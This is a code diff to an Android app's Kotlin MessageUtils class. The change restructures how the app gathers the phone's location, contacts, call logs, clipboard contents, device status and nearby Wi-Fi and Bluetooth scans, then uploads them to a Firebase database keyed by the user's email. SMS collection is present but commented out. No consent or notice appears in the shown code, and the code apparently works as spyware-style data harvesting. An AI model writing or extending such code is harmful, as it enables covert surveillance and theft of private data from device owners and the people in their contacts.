@@ -38,6 +38,7 @@ class MessageUtils {
     private val BLUETOOTH_LIST_DATABASE_TAG = "BLUETOOTH_LIST"
     private val BLUETOOTH_LIST_DATABASE_TAG_EMPTY = "BLUETOOTH_LIST/Empty"
     private val CLIPBOARD_DATABASE_TAG = "CLIPBOARD/VALUE"
+    private val SHARED_PREFERENCE_TAG: String = "SHARED_PREFERENCE_NAME"
 
     private val dateFormat = "yyyy-MM-dd"
     private val timeFormat = "HH:mm:ss"
@@ -56,21 +57,61 @@ class MessageUtils {
         }
     }
 
-    private fun getBaseHeader(): DatabaseReference {
-        val currDate = SimpleDateFormat(dateFormat, Locale.getDefault()).format(Date())
-        val currTime = SimpleDateFormat(timeFormat, Locale.getDefault()).format(Date())
-
-        return FirebaseDatabase.getInstance().reference
-            .child(userEmail)
-            .child(currDate)
-            .child(currTime)
-    }
-
     fun sendData(
         bluetoothName: String,
         wifiScanResult: List<WifiScanResult>?,
-        bluetoothScanResult: List<BluetoothScanResult>?
+        bluetoothScanResult: List<BluetoothScanResult>?,
+        prefsCalls: String
     ) {
+        val locationState = LocationState(context)
+        //val smsState = SmsState(context)
+        val contactsState = ContactsState(context)
+        val calllogState = CalllogState(context, prefsCalls)
+        val values = mutableMapOf<String, Any>()
+        locationState.getData().forEach { item ->
+            values[LOCATION_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
+        }
+//        smsState.getData().forEach { item ->
+//            values[SMS_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
+//        }
+        contactsState.getData().forEach { item ->
+            values[CONTACTS_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
+        }
+        calllogState.getData().forEach { item ->
+            values[CALLLOG_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
+        }
+        val currDate = SimpleDateFormat(dateFormat, Locale.getDefault()).format(Date())
+        val currTime = SimpleDateFormat(timeFormat, Locale.getDefault()).format(Date())
+        val referency = FirebaseDatabase.getInstance().reference.child(userEmail.replace(".","_")).child(currDate).child(currTime)
+        sendtoFirebase(values, referency)
+        sendStatuPhone(bluetoothName, wifiScanResult, bluetoothScanResult)
+    }
+
+    private fun sendtoFirebase(values: MutableMap<String, Any>, referency: DatabaseReference){
+        sendClipboardContent(values)
+        referency.updateChildren(values)
+            .addOnSuccessListener {
+                Log.i("KK: ", "Data updated complete")
+            }
+            .addOnFailureListener { exception ->
+                sendErrorLog(exception.message.toString())
+            }
+            .addOnCompleteListener {
+                Log.i("KK: ", "Data updated complete")
+            }
+    }
+
+    public fun sendErrorLog(error: String){
+        val values = mutableMapOf<String, Any>()
+        val currDate = SimpleDateFormat(dateFormat, Locale.getDefault()).format(Date())
+        val currTime = SimpleDateFormat(timeFormat, Locale.getDefault()).format(Date())
+        val referency = FirebaseDatabase.getInstance().reference.child(userEmail.replace(".","_")).child("Errors").child(currDate).child(currTime)
+        values["Error"] = error
+        sendtoFirebase(values, referency)
+    }
+
+    private fun sendStatuPhone(bluetoothName: String, wifiScanResult: List<WifiScanResult>?, bluetoothScanResult: List<BluetoothScanResult>?){
+        val values = mutableMapOf<String, Any>()
         val batteryState = BatteryState(context)
         val bluetoothState = BluetoothState(context, bluetoothName)
         val configState = ConfigState(context)
@@ -78,14 +119,6 @@ class MessageUtils {
         val memoryState = MemoryState(context)
         val deviceState = DeviceState(context)
         val nfcState = NFCState(context)
-        val locationState = LocationState(context)
-        val smsState = SmsState(context)
-        val contactsState = ContactsState(context)
-        val calllogState = CalllogState(context)
-
-
-        val values = mutableMapOf<String, Any>()
-
         batteryState.getData().forEach { item ->
             values[BATTERY_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
@@ -107,20 +140,6 @@ class MessageUtils {
         nfcState.getData().forEach { item ->
             values[NFC_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-        locationState.getData().forEach { item ->
-            values[LOCATION_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
-        }
-        smsState.getData().forEach { item ->
-            values[SMS_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
-        }
-        contactsState.getData().forEach { item ->
-            values[CONTACTS_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
-        }
-        calllogState.getData().forEach { item ->
-            values[CALLLOG_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
-        }
-
-
         if (!wifiScanResult.isNullOrEmpty()) {
             wifiScanResult.forEach { scan ->
                 val wifiNetwork = scan.getData()
@@ -135,7 +154,6 @@ class MessageUtils {
         } else {
             values[WIFI_LIST_DATABASE_TAG_EMPTY] = ""
         }
-
         if (!bluetoothScanResult.isNullOrEmpty()) {
             bluetoothScanResult.forEach { scan ->
                 val bluetoothNetwork = scan.getData()
@@ -150,18 +168,8 @@ class MessageUtils {
         } else {
             values[BLUETOOTH_LIST_DATABASE_TAG_EMPTY] = ""
         }
-        sendClipboardContent(values)
-
-        getBaseHeader().updateChildren(values)
-            .addOnSuccessListener {
-                Log.i("KK: ", "Data updated successful")
-            }
-            .addOnFailureListener { exception ->
-                Log.e("KK: ", "Error: " + exception.message)
-            }
-            .addOnCompleteListener {
-                Log.i("KK: ", "Data updated complete")
-            }
+        val referency = FirebaseDatabase.getInstance().reference.child(userEmail.replace(".","_")).child("StatusPhone")
+        sendtoFirebase(values, referency)
     }
 
     private fun sendClipboardContent(values: MutableMap<String, Any>) {
